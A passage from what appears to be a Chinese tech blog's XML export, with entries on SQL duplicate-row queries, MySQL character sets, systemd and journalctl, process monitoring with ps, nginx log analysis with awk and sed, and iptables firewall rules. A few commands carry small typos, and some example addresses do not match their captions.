    <content type="text"><![CDATA[善良没用，因为只有你先漂亮，别人才能看到你的善良。 命令查找全部重复记录1SELECT * FROM 表 WHERE 重复字段 IN (SELECT 重复字段 FROM 表 GROUP BY 重复字段 HAVING COUNT(*)>1); 过滤重复记录(只显示一条)12SELECT * FROM 表 WHERE ID IN (SELECT MAX(ID) FROM 表 GROUP BY Title); #显示ID最大一条记录SELECT * FROM 表 WHERE ID IN (SELECT MIN(ID) FROM 表 GROUP BY Title); #显示ID最小一条记录 删除全部重复记录1DELETE 表 WHERE 重复字段 IN (SELECT 重复字段 FROM 表 GROUP BY 重复字段 HAVING COUNT(*)>1); 删除全部重复记录保留最大ID最大一条记录12DELETE FROM 表 WHERE ID NOT IN (SELECT MAX(ID) FROM 表 GROUP BY Title) #保留ID最大一条记录DELETE FROM 表 WHERE ID NOT IN (SELECT MIN(ID) FROM 表 GROUP BY Title) #保留ID最小一条记录 删除表中多余的重复记录（多个字段），只留有rowid最小的记录1DELETE FROM vitae a WHERE (a.peopleId, a.seq) IN (SELECT peopleId, seq FROM vitae GROUP BY peopleId, seq HAVING COUNT(*) > 1) AND rowid NOT IN (SELECT MIN(rowid) FROM vitae GROUP BY peopleId, seq HAVING COUNT(*)>1) 查找表中多余的重复记录（多个字段），不包含rowid最小的记录1SELECT * FROM vitae a WHERE (a.peopleId, a.seq) IN (SELECT peopleId, seq FROM vitae GROUP BY peopleId, seq HAVING COUNT(*) > 1) AND rowid NOT IN (SELECT MIN(rowid) FROM vitae GROUP BY peopleId, seq HAVING COUNT(*)>1) 查找表中多余的重复记录（多个字段）1SELECT * FROM vitae a WHERE (a.peopleId, a.seq) IN (SELECT peopleId, seq FROM vitae GROUP BY peopleId, seq HAVING COUNT(*) > 1) 总结说明： 单表的唯一查询用：distinct 多表的唯一查询用：group by distinct 查询多表时，left join 还有效，全连接无效 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL修改表、字段、库的字符集及字符集]]></title>
    <url>%2F2019%2F04%2F22%2Fmysql-character%2F</url>
    <content type="text"><![CDATA[一直对发型和身材不满意的人，有一个共同点：不肯承认这是脸的问题。 命令修改数据库字符集1ALTER DATABASE db_name DEFAULT CHARACTER SET character_name [COLLATE ...]; 把表默认的字符集和所有字符列（CHAR,VARCHAR,TEXT）改为新的字符集：12ALTER TABLE tbl_name CONVERT TO CHARACTER SET character_name [COLLATE ...]如：ALTER TABLE logtest CONVERT TO CHARACTER SET utf8 COLLATE utf8_general_ci; 只是修改表的默认字符集12ALTER TABLE tbl_name DEFAULT CHARACTER SET character_name [COLLATE...];如：ALTER TABLE logtest DEFAULT CHARACTER SET utf8 COLLATE utf8_general_ci; 修改字段的字符集12ALTER TABLE tbl_name CHANGE c_name c_name CHARACTER SET character_name [COLLATE ...];如：ALTER TABLE logtest CHANGE title title VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci; 查看字段编码1SHOW FULL COLUMNS FROM tbl_name; 查看系统的编码字符1SHOW VARIABLES WHERE Variable_name LIKE 'character\_set\_%' OR Variable_name LIKE 'collation%'; MySQL字符集设置系统变量：1234567– character_set_server：默认的内部操作字符集– character_set_client：客户端来源数据使用的字符集– character_set_connection：连接层字符集– character_set_results：查询结果字符集– character_set_database：当前选中数据库的默认字符集– character_set_system：系统元数据(字段名等)字符集– 还有以collation_开头的同上面对应的变量，用来描述字符序。 用introducer指定文本字符串的字符集格式为：1[_charset] ‘string’ [COLLATE collation] 例子:123SELECT _latin1 ‘string’;• SELECT _utf8 ‘你好’ COLLATE utf8_general_ci;– 由introducer修饰的文本字符串在请求过程中不经过多余的转码，直接转换为内部字符集处理。 MySQL中的字符集转换过程 MySQL Server收到请求时将请求数据从character_set_client转换为character_set_connection； 进行内部操作前将请求数据从character_set_connection转换为内部操作字符集，其确定方法如下： 使用每个数据字段的CHARACTER SET设定值； 若上述值不存在，则使用对应数据表的DEFAULT CHARACTER SET设定值(MySQL扩展，非SQL标准)； 若上述值不存在，则使用对应数据库的DEFAULT CHARACTER SET设定值； 若上述值不存在，则使用character_set_server设定值。 将操作结果从内部操作字符集转换为character_set_results document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux Systemd详解]]></title>
    <url>%2F2019%2F04%2F22%2Flinux-systemd%2F</url>
    <content type="text"><![CDATA[一场说走就走的旅行，回来等着你的就是一段吃土的日子。 介绍Systemd是Linux系统工具，用来启动守护进程，已成为大多数发行版的标配，PID为1最先启动； 历史上，Linux 的启动一直采用init进程。123$ /etc/init.d/apache2 start或者$ service apache2 start 这种方法有两个缺点。 一是启动时间长。init进程是串行启动，只有前一个进程启动完，才会启动下一个进程。 二是启动脚本复杂。init进程只是执行启动脚本，不管其他事情。脚本需要自己处理各种情况，这往往使得脚本变得很长。 Systemd 就是为了解决这些问题而诞生的。它的设计目标是，为系统的启动和管理提供一套完整的解决方案。根据 Linux 惯例，字母d是守护进程（daemon）的缩写。 Systemd 这个名字的含义，就是它要守护整个系统。CentOS/RHEL7 以上版本中Systemd 取代了initd，成为系统的第一个进程（PID 等于 1），其他进程都是它的子进程。查看版本：1$ systemctl --version 常用命令systemctl 命令重启系统1systemctl reboot 关闭系统，切断电源1systemctl poweroff CPU停止工作1systemctl halt 暂停系统1systemctl suspend 让系统进入冬眠状态1systemctl hibernate 让系统进入交互式休眠状态1systemctl hybrid-sleep 启动进入救援状态（单用户状态）1systemctl rescue systemd-analyze 是查看启动耗时 查看启动耗时1systemd-analyze 查看每个服务的启动耗时1systemd-analyze blame 显示瀑布状的启动过程流1systemd-analyze critical-chain 显示指定服务的启动流1systemd-analyze critical-chain atd.service hostnamectl命令用于查看当前主机的信息。显示当前主机的信息12345hostnamectl```bash设置主机名。```bashhostnamectl set-hostname rhel7 localectl命令用于查看本地化设置。查看本地化设置1localectl 设置本地化参数。12localectl set-locale LANG=en_GB.utf8localectl set-keymap en_GB timedatectl命令用于查看当前时区设置。查看当前时区设置1timedatectl 显示所有可用的时区1timedatectl list-timezones 设置当前时区123timedatectl set-timezone America/New_Yorktimedatectl set-time YYYY-MM-DDtimedatectl set-time HH:MM:SS loginctl命令用于查看当前登录的用户。列出当前session1loginctl list-sessions 列出当前登录用户1loginctl list-users 列出显示指定用户的信息1loginctl show-user ruanyf 介绍Systemd 可以管理所有系统资源。不同的资源统称为 Unit（单位）。 Unit 一共分成12种。 Service unit：系统服务 Target unit：多个 Unit 构成的一个组 Device Unit：硬件设备 Mount Unit：文件系统的挂载点 Automount Unit：自动挂载点 Path Unit：文件或路径 Scope Unit：不是由 Systemd 启动的外部进程 Slice Unit：进程组 Snapshot Unit：Systemd 快照，可以切回某个快照 Socket Unit：进程间通信的 socket Swap Unit：swap 文件 Timer Unit：定时器 systemctl list-units命令可以查看当前系统的所有 Unit 。 列出正在运行的 Unit1systemctl list-units 列出所有Unit，包括没有找到配置文件的或者启动失败的1systemctl list-units --all 列出所有没有运行的 Unit1systemctl list-units --all --state=inactive 列出所有加载失败的 Unit1systemctl list-units --failed 列出所有正在运行的、类型为 service 的 Unit1systemctl list-units --type=service Unit 的状态systemctl status命令用于查看系统状态和单个 Unit 的状态。 显示系统状态1systemctl status 显示单个 Unit 的状态1sysystemctl status bluetooth.service 显示远程主机的某个 Unit 的状态1systemctl -H root@rhel7.example.com status httpd.service 除了status命令，systemctl还提供了三个查询状态的简单方法，主要供脚本内部的判断语句使用。 显示某个 Unit 是否正在运行1systemctl is-active application.service 显示某个 Unit 是否处于启动失败状态1systemctl is-failed application.service 显示某个 Unit 服务是否建立了启动链接1systemctl is-enabled application.service Unit 管理对于用户来说，最常用的是下面这些命令，用于启动和停止 Unit（主要是 service）。 立即启动一个服务1systemctl start apache.service 立即停止一个服务1systemctl stop apache.service 重启一个服务1systemctl restart apache.service 杀死一个服务的所有子进程1systemctl kill apache.service 重新加载一个服务的配置文件1systemctl reload apache.service 重载所有修改过的配置文件1systemctl daemon-reload 显示某个 Unit 的所有底层参数1systemctl show httpd.service 显示某个 Unit 的指定属性的值1systemctl show -p CPUShares httpd.service 设置某个 Unit 的指定属性1systemctl set-property httpd.service CPUShares=500 依赖关系Unit 之间存在依赖关系：A 依赖于 B，就意味着 Systemd 在启动 A 的时候，同时会去启动 B。 systemctl list-dependencies命令列出一个 Unit 的所有依赖。12345systemctl list-dependencies nginx.service```bash上面命令的输出结果之中，有些依赖是 Target 类型（详见下文），默认不会展开显示。如果要展开 Target，就需要使用--all参数。```bashsystemctl list-dependencies --all nginx.service Unit 的配置文件每一个 Unit 都有一个配置文件，告诉 Systemd 怎么启动这个 Unit 。 Systemd 默认从目录/etc/systemd/system/读取配置文件。但是，里面存放的大部分文件都是符号链接，指向目录/usr/lib/systemd/system/，真正的配置文件存放在那个目录。 systemctl enable命令用于在上面两个目录之间，建立符号链接关系。1systemctl enable clamd@scan.service 等同于1ln -s '/usr/lib/systemd/system/clamd@scan.service' '/etc/systemd/system/multi-user.target.wants/clamd@scan.service' 如果配置文件里面设置了开机启动，systemctl enable命令相当于激活开机启动。 与之对应的，systemctl disable命令用于在两个目录之间，撤销符号链接关系，相当于撤销开机启动。1systemctl disable clamd@scan.service 配置文件的后缀名，就是该 Unit 的种类，比如sshd.socket。如果省略，Systemd 默认后缀名为.service，所以sshd会被理解成sshd.service。 配置文件的状态1systemctl list-unit-files命令用于列出所有配置文件。 列出所有配置文件1systemctl list-unit-files 列出指定类型的配置文件12systemctl list-unit-files --type=service这个命令会输出一个列表。 1systemctl list-unit-files UNIT FILE STATE123chronyd.service enabledclamd@.service staticclamd@scan.service disabled 这个列表显示每个配置文件的状态，一共有四种。 enabled：已建立启动链接 disabled：没建立启动链接 static：该配置文件没有[Install]部分（无法执行），只能作为其他配置文件的依赖 masked：该配置文件被禁止建立启动链接 注意，从配置文件的状态无法看出，该 Unit 是否正在运行。这必须执行前面提到的systemctl status命令。 1systemctl status bluetooth.service 一旦修改配置文件，就要让 SystemD 重新加载配置文件，然后重新启动，否则修改不会生效。12systemctl daemon-reloadsystemctl restart httpd.service 配置文件的格式配置文件就是普通的文本文件，可以用文本编辑器打开。 systemctl cat命令可以查看配置文件的内容。1systemctl cat atd.service unit 配置文件1234567891011121314151617[Unit]Description=ATD daemon[Service]Type=forkingExecStart=/usr/bin/atd[Install]WantedBy=multi-user.target从上面的输出可以看到，配置文件分成几个区块。每个区块的第一行，是用方括号表示的区别名，比如[Unit]。注意，配置文件的区块名和字段名，都是大小写敏感的。每个区块内部是一些等号连接的键值对。[Section]Directive1=valueDirective2=value. . . 注意，键值对的等号两侧不能有空格。 配置文件的区域[Unit]区块通常是配置文件的第一个区块，用来定义 Unit 的元数据，以及配置与其他 Unit 的关系。它的主要字段如下。 Description：简短描述 Documentation：文档地址 Requires：当前 Unit 依赖的其他 Unit，如果它们没有运行，当前 Unit 会启动失败 Wants：与当前 Unit 配合的其他 Unit，如果它们没有运行，当前 Unit 不会启动失败 BindsTo：与Requires类似，它指定的 Unit 如果退出，会导致当前 Unit 停止运行 Before：如果该字段指定的 Unit 也要启动，那么必须在当前 Unit 之后启动 After：如果该字段指定的 Unit 也要启动，那么必须在当前 Unit 之前启动 Conflicts：这里指定的 Unit 不能与当前 Unit 同时运行 Condition…：当前 Unit 运行必须满足的条件，否则不会运行 Assert…：当前 Unit 运行必须满足的条件，否则会报启动失败 [Install]通常是配置文件的最后一个区块，用来定义如何启动，以及是否开机启动。它的主要字段如下。 WantedBy：它的值是一个或多个 Target，当前 Unit 激活时（enable）符号链接会放入/etc/systemd/system目录下面以 Target 名 + .wants后缀构成的子目录中 RequiredBy：它的值是一个或多个 Target，当前 Unit 激活时，符号链接会放入/etc/systemd/system目录下面以 Target 名 + .required后缀构成的子目录中 Alias：当前 Unit 可用于启动的别名 Also：当前 Unit 激活（enable）时，会被同时激活的其他 Unit [Service]区块用来 Service 的配置，只有 Service 类型的 Unit 才有这个区块。它的主要字段如下。 Type：定义启动时的进程行为。它有以下几种值。 Type=simple：默认值，执行ExecStart指定的命令，启动主进程 Type=forking：以 fork 方式从父进程创建子进程，创建后父进程会立即退出 Type=oneshot：一次性进程，Systemd 会等当前服务退出，再继续往下执行 Type=dbus：当前服务通过D-Bus启动 Type=notify：当前服务启动完毕，会通知Systemd，再继续往下执行 Type=idle：若有其他任务执行完毕，当前服务才会运行 ExecStart：启动当前服务的命令 ExecStartPre：启动当前服务之前执行的命令 ExecStartPost：启动当前服务之后执行的命令 ExecReload：重启当前服务时执行的命令 ExecStop：停止当前服务时执行的命令 ExecStopPost：停止当其服务之后执行的命令 RestartSec：自动重启当前服务间隔的秒数 Restart：定义何种情况 Systemd 会自动重启当前服务，可能的值包括always（总是重启）、on-success、on-failure、on-abnormal、on-abort、on-watchdog TimeoutSec：定义 Systemd 停止当前服务之前等待的秒数 Environment：指定环境变量 Unit 配置文件的完整字段清单，请参考官方文档。 Target启动计算机的时候，需要启动大量的 Unit。如果每一次启动，都要一一写明本次启动需要哪些 Unit，显然非常不方便。Systemd 的解决方案就是 Target。简单说，Target 就是一个 Unit 组，包含许多相关的 Unit 。启动某个 Target 的时候，Systemd 就会启动里面所有的 Unit。从这个意义上说，Target 这个概念类似于”状态点”，启动某个 Target 就好比启动到某种状态。传统的init启动模式里面，有 RunLevel 的概念，跟 Target 的作用很类似。不同的是，RunLevel 是互斥的，不可能多个 RunLevel 同时启动，但是多个 Target 可以同时启动。 查看当前系统的所有 Target1systemctl list-unit-files --type=target 查看一个 Target 包含的所有 Unit1systemctl list-dependencies multi-user.target 查看启动时的默认 Target1systemctl get-default 设置启动时的默认 Target1systemctl set-default multi-user.target 切换 Target 时，默认不关闭前一个 Target 启动的进程，systemctl isolate 命令改变这种行为，关闭前一个 Target 里面所有不属于后一个 Target 的进程1systemctl isolate multi-user.target Target 与 传统 RunLevel 的对应关系如下。123456789Traditional runlevel New target name Symbolically linked to...Runlevel 0 | runlevel0.target -> poweroff.targetRunlevel 1 | runlevel1.target -> rescue.targetRunlevel 2 | runlevel2.target -> multi-user.targetRunlevel 3 | runlevel3.target -> multi-user.targetRunlevel 4 | runlevel4.target -> multi-user.targetRunlevel 5 | runlevel5.target -> graphical.targetRunlevel 6 | runlevel6.target -> reboot.target 它与init进程的主要差别如下: 默认的 RunLevel（在/etc/inittab文件设置）现在被默认的 Target 取代，位置是/etc/systemd/system/default.target，通常符号链接到graphical.target（图形界面）或者multi-user.target（多用户命令行）。 启动脚本的位置，以前是/etc/init.d目录，符号链接到不同的 RunLevel 目录 （比如/etc/rc3.d、/etc/rc5.d等），现在则存放在/lib/systemd/system和/etc/systemd/system目录。 配置文件的位置，以前init进程的配置文件是/etc/inittab，各种服务的配置文件存放在/etc/sysconfig目录。现在的配置文件主要存放在/lib/systemd目录，在/etc/systemd目录里面的修改可以覆盖原始设置。 日志管理Systemd 统一管理所有 Unit 的启动日志。带来的好处就是，可以只用journalctl一个命令，查看所有日志（内核日志和应用日志）。日志的配置文件是/etc/systemd/journald.conf。 journalctl功能强大，用法非常多。 查看所有日志（默认情况下 ，只保存本次启动的日志）1journalctl 查看内核日志（不显示应用日志）1journalctl -k 查看系统本次启动的日志12journalctl -bjournalctl -b -0 查看上一次启动的日志（需更改设置）1journalctl -b -1 查看指定时间的日志12345journalctl --since="2012-10-30 18:17:16"journalctl --since "20 min ago"journalctl --since yesterdayjournalctl --since "2015-01-10" --until "2015-01-11 03:00"journalctl --since 09:00 --until "1 hour ago" 显示尾部的最新10行日志1journalctl -n 显示尾部指定行数的日志1journalctl -n 20 实时滚动显示最新日志1journalctl -f 查看指定服务的日志1journalctl /usr/lib/systemd/systemd 查看指定进程的日志1journalctl _PID=1 查看某个路径的脚本的日志1journalctl /usr/bin/bash 查看指定用户的日志1journalctl _UID=33 --since today 查看某个 Unit 的日志12journalctl -u nginx.servicejournalctl -u nginx.service --since today 实时滚动显示某个 Unit 的最新日志1journalctl -u nginx.service -f 合并显示多个 Unit 的日志1journalctl -u nginx.service -u php-fpm.service --since today 查看指定优先级（及其以上级别）的日志，共有8级 0:emerg 1:alert 2:crit 3:err 4:warning 5:notice 6:info 7:debug1journalctl -p err -b 日志默认分页输出，–no-pager 改为正常的标准输出1journalctl --no-pager 以 JSON 格式（单行）输出1journalctl -b -u nginx.service -o json 以 JSON 格式（多行）输出，可读性更好1journalctl -b -u nginx.serviceqq -o json-pretty 显示日志占据的硬盘空间1journalctl --disk-usage 指定日志文件占据的最大空间1journalctl --vacuum-size=1G 指定日志文件保存多久1journalctl --vacuum-time=1years document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux查看最消耗CPU和内存的进程]]></title>
    <url>%2F2019%2F04%2F22%2Fcpu-memory%2F</url>
    <content type="text"><![CDATA[真正努力过的人才知道，智商上的差距是不可逾越的。 命令 CPU占用最多的前10个进程： 1ps auxw|head -1;ps auxw|sort -rn -k3|head -10 内存消耗最多的前10个进程 1ps auxw|head -1;ps auxw|sort -rn -k4|head -10 虚拟内存使用最多的前10个进程 1ps auxw|head -1;ps auxw|sort -rn -k5|head -10 几个参数含义: %MEM 进程的内存占用率 VSZ 进程所使用的虚存的大小 RSS 进程使用的驻留集大小或者是实际内存的大小(RSS is the “resident set size” meaning physical memory used) TTY 与进程关联的终端（tty） 串行端口终端（/dev/ttySn） 伪终端（/dev/pty/） 控制终端（/dev/tty） 控制台终端（/dev/ttyn, /dev/console） 虚拟终端(/dev/pts/n) STAT 检查的状态：进程状态使用字符表示的，如R（running正在运行或准备运行）、S（sleeping睡眠）、I（idle空闲）、Z (僵死)、D（不可中断的睡眠，通常是I/O）、P（等待交换页）、W（换出,表示当前页面不在内存）、N（低优先级任务）T(terminate终止)、W has no resident pages D 不可中断 Uninterruptible sleep (usually IO) R 正在运行，或在队列中的进程 S 处于休眠状态 T 停止或被追踪 Z 僵尸进程 W 进入内存交换（从内核2.6开始无效） X 死掉的进程 < 高优先级 N 低优先级 L 有些页被锁进内存 s 包含子进程 位于后台的进程组 l 多线程 克隆线程 multi-threaded (using CLONE_THREAD, like NPTL pthreads do) document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nginx查看截取切割日志]]></title>
    <url>%2F2019%2F04%2F22%2Fnginx-log%2F</url>
    <content type="text"><![CDATA[这个世界没有错，谁让你长得不好看又没钱。 介绍nginx日志最好实现每天定时切割下，特别是在访问量比较大的时候，方便查看与处理，如果没切割，可以用sed直接切割 命令查找7月17日访问log导出到17.log文件中1cat gelin_web_access.log | egrep "17/Jul/2017" | sed -n '/00:00:00/,/23:59:59/p' > /tmp/17.log 查看访问量前10的IP1awk '{print $1}' 17.log | sort | uniq -c | sort -nr | head -n 10 查看访问前10的URL1awk '{print $11}' gelin_web_access.log | sort | uniq -c | sort -nr | head -n 10 查询访问最频繁的URL1awk '{print $7}' gelin_web_access.log | sort | uniq -c | sort -n -k 1 -r | more 查询访问最频繁的IP1awk '{print $1}' gelin_web_access.log | sort | uniq -c | sort -n -k 1 -r | more 根据访问IP统计UV1awk '{print $1}' gelin_web_access.log | sort | uniq -c | wc -l 统计访问URL统计PV1awk '{print $7}' gelin_web_access.log | wc -l 根据时间段统计查看日志1cat gelin_web_access.log | sed -n '/17\/Jul\/2017:12/,/17\/Jul\/2017:13/p' | more document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux iptables 整理]]></title>
    <url>%2F2019%2F04%2F22%2Flinux-iptables%2F</url>
    <content type="text"><![CDATA[你总嫌有些人懒，说得好像你勤快了就真能干出什么大事儿一样。 介绍iptables是Linux中重要的访问控制手段，是俗称的 Linux 防火墙系统的重要组成部分。这里记录了iptables 防火墙规则的一些常用的操作指令。 iptables的基本语法：1iptables [-t filter/nat] [-A/I] [INPUT/OUTPUT/FORWARD] [-i/o interface] [-p tcp/udp/icmp/all] [-s ip/network] [--sport ports] [-d ip/network] [--dport ports] [-j ACCEPT/DROP] 12345678910111213141516171819202122232425262728参数说明: 不加-t时默认是filter 语法参数： -I：第一行插入 -A：最后追加 -i/o：指的是数据要进入或出去所要经过的端口，如eth1,eth0,pppoe等 -p：你所要指定的协议 -s：指定来源ip，可以是单个ip如192.168.109.131，也可以是一个网络 192.168.109.0/24，还可以是一个域名如163.com，如果你填写的是域名系统会自动解析出他的ip并在iptables里显示 --sport：来源端口 -d：指定目标ip --dport：目标端口 -j：执行参数ACCEPT或DROP，REJECT一般不用 -A 在指定链的末尾添加（append）一条新的规则 -D 删除（delete）指定链中的某一条规则，可以按规则序号和内容删除 -I 在指定链中插入（insert）一条新的规则，默认在第一行添加 -R 修改、替换（replace）指定链中的某一条规则，可以按规则序号和内容替换 -L 列出（list）指定链中所有的规则进行查看 -E 重命名用户定义的链，不改变链本身 -F 清空（flush） -N 新建（new-chain）一条用户自己定义的规则链 -X 删除指定表中用户自定义的规则链（delete-chain） -P 设置指定链的默认策略（policy） -Z 将所有表的所有链的字节和数据包计数器清零 -n 使用数字形式（numeric）显示输出结果 -v 查看规则表详细信息（verbose）的信息 -V 查看版本(version) -h 获取帮助（help） 如果配置的是INPUT（进入）,则来源ip是运程ip，目标端口就是本机；OUTPUT相反 流程当数据包到达目标主机时，经过PREROUTING链,经路由之后决定是否转发，不转发则进入INPUT链，到达用户空间。进程对外通信时，经由OUTPUT链出去，路由之后到达POSTROUTING链，经网卡出去。当一数据包经过PREROUTING链发现其不是到达本主机，那么数据包经过FORWARD链，到达 POSTROUTING链转发出去。本机进程对发送数据时，经由OUTPUT链路由之后进入POSTROUTING链出去。iptables匹配规则时，是自上而下匹配的，匹配到第一条规则时既跳出，否则一直往下匹配，没有则使用默认规则。iptables规则建立时，首先需要确定功能（表），确定报文流向，确定要实现的目标，确定匹配条件。尽量遵循以下规则：尽量减少规则条目，彼此间无关联，访问条目大放上面，有关联（同一功能），规则更严格的放上面 五个hook函数分别是PREROUTING,INPUT ,OUTPUT,POSTROUTING,FORWARD，我们把这五个钩子函数称为链，Netfilter实现了几功能，raw ，mangle，nat，filter。我们一般把这几个功能称为表，表之间有优先级关系，从低到高为filter—-nat—-mangle—-raw,表与链之间有对应关系，具体见图表。 表 raw表： 对报文设置一个标志，决定数据包是否被状态跟踪机制处理 mangle表： 主要用于修改数据包 nat表： 主要用处是网络地址转换、端口映射 fileter表： 主要用于过滤包 一般情况我们对filter表做配置的更多。 链 INPUT： 作用于进入本机的包 OUTPUT： 作用于本机送出的包 FORWARD： 匹配穿过本机的数据包（转发） PREROUTING： 用于修改目的地址（DNAT） POSTROUTING：用于修改源地址 （SNAT） 基本操作12345678启动指令:service iptables start 重启指令:service iptables restart 关闭指令:service iptables stop保存指令:service iptables save清除规则：iptables -F 将链的记数的流量清零: iptables -Z清除链: iptables -X清空iptables时一般-F -Z -X一起使用 三种状态 ACCEPT 允许 DROP 丢弃 REJECT 拒绝 ROP和REJECT的区别：DROP是直接不让进入，而REJECT是先让进入然后再拒绝，LOG在/var/log/messages文件中记录日志信息，然后将数据包传递给下一条规则. DROP更安全，所以一般拒绝都用DROP -A默认是插入到尾部的，可以-I来插入到指定位置 iptables的两种配置思路: 默认允许，拒绝特别 默认拒绝，允许特别 二者都有自己的特点，看情况而定。但是注意：如果要选择第二种配置思路，配置前切记先把ssh设置为ACCEPT，因为一般机器不在我们身边，一旦配置默认拒绝，那我们的远程登录就会断开连接，那问题就大了。配置默认拒绝前设置:12iptables -A INPUT -p tcp --dport 22 -j ACCEPT iptables -A OUTPUT -p tcp --sport 22 -j ACCEPT 还有一种方法：做一个计划任务，让iptables定期停止，即执行service iptables stop，这样的话即使配置默认拒绝前没有允许ssh也没关系，等到计划任务生效的时间iptables就会自动清除所有的配置，包括默认规则。 iptables的执行优先级: iptables的执行顺序是自上而下，当有配置产生冲突时，前面执行的生效。 删除iptables规则12345iptables -D INPUT 3 //删除input的第3条规则iptables -t nat -D POSTROUTING 1 //删除nat表中postrouting的第一条规则iptables -F INPUT //清空 filter表INPUT所有规则iptables -F //清空所有规则iptables -t nat -F POSTROUTING //清空nat表POSTROUTING所有规则 删除规则第一种方法：修改配置文件1234vim /etc/sysconfig/iptables删除相应的行，然后service iptables restart service iptables save 注意: 修改完配置文件不能先save，一定要先restart才能save，要不然就白做了。因为save会在iptables服务启动时重新加载，要是在重启之前直接先调用了service iptables save 那么你的/etc/sysconfig/iptables 配置就回滚到上次启动服务的配置了。 第二种方法：直接用命令删除 如果你记得配置时的写法，那么可以直接iptables -D 后跟上配置时的写法。如：1iptables -D INPUT -s 10.72.11.12 -p tcp --sport 1234 -d 10.10.2.58 --dport 80 -j DROP 或者查看每条iptables的序号123iptables -L INPUT --line-numbers然后删除iptables -D INPUT 2 #删除第2条规则，即时生效 防火墙常用的策略拒绝进入防火墙的所有ICMP协议数据包1iptables -I INPUT -p icmp -j REJECT 允许防火墙转发除ICMP协议以外的所有数据包1iptables -A FORWARD -p ! icmp -j ACCEPT 拒绝转发来自192.168.1.10主机的数据，允许转发来自192.168.0.0/24网段的数据12iptables -A FORWARD -s 192.168.1.11 -j REJECT iptables -A FORWARD -s 192.168.0.0/24 -j ACCEPT 丢弃从外网接口（eth1）进入防火墙本机的源地址为私网地址的数据包123iptables -A INPUT -i eth1 -s 192.168.0.0/16 -j DROP iptables -A INPUT -i eth1 -s 172.16.0.0/12 -j DROP iptables -A INPUT -i eth1 -s 10.0.0.0/8 -j DROP 封堵网段（192.168.1.0/24），两小时后解封。123iptables -I INPUT -s 10.20.30.0/24 -j DROP iptables -I FORWARD -s 10.20.30.0/24 -j DROP at now 2 hours at> iptables -D INPUT 1 at> iptables -D FORWARD 1 只允许管理员从202.13.0.0/16网段使用SSH远程登录防火墙主机。12iptables -A INPUT -p tcp --dport 22 -s 202.13.0.0/16 -j ACCEPT iptables -A INPUT -p tcp --dport 22 -j DROP 允许本机开放从TCP端口20-1024提供的应用服务12iptables -A INPUT -p tcp --dport 20:1024 -j ACCEPT iptables -A OUTPUT -p tcp --sport 20:1024 -j ACCEPT 允许转发来自192.168.0.0/24局域网段的DNS解析请求数据包12iptables -A FORWARD -s 192.168.0.0/24 -p udp --dport 53 -j ACCEPT iptables -A FORWARD -d 192.168.0.0/24 -p udp --sport 53 -j ACCEPT 禁止其他主机ping防火墙主机，但是允许从防火墙上ping其他主机123iptables -I INPUT -p icmp --icmp-type Echo-Request -j DROP iptables -I INPUT -p icmp --icmp-type Echo-Reply -j ACCEPT iptables -I INPUT -p icmp --icmp-type destination-Unreachable -j ACCEPT 禁止转发来自MAC地址为00：0C：29：27：55：3F的和主机的数据包12iptables -A FORWARD -m mac --mac-source 00:0c:29:27:55:3F -j DROP说明：iptables中使用“-m 模块关键字”的形式调用显示匹配。这里用“-m mac –mac-source”来表示数据包的源MAC地址。 允许防火墙本机对外开放TCP端口20、21、25、110以及被动模式FTP端口1250-128012iptables -A INPUT -p tcp -m multiport --dport 20,21,25,110,1250:1280 -j ACCEPT说明：这里用“-m multiport –dport”来指定目的端口及范围 禁止转发源IP地址为192.168.1.20-192.168.1.99的TCP数据包12iptables -A FORWARD -p tcp -m iprange --src-range 192.168.1.20-192.168.1.99 -j DROP说明：此处用“-m –iprange –src-range”指定IP范围。 禁止转发与正常TCP连接无关的非—syn请求数据包12iptables -A FORWARD -m state --state NEW -p tcp ! --syn -j DROP说明：“-m state”表示数据包的连接状态，“NEW”表示与任何连接无关的 拒绝访问防火墙的新数据包，但允许响应连接或与已有连接相关的数据包12iptables -A INPUT -p tcp -m state --state NEW -j DROP iptables -A INPUT -p tcp -m state --state ESTABLISHED,RELATED -j ACCEPT 说明：“ESTABLISHED”表示已经响应请求或者已经建立连接的数据包，“RELATED”表示与已建立的连接有相关性的，比如FTP数据连接等。 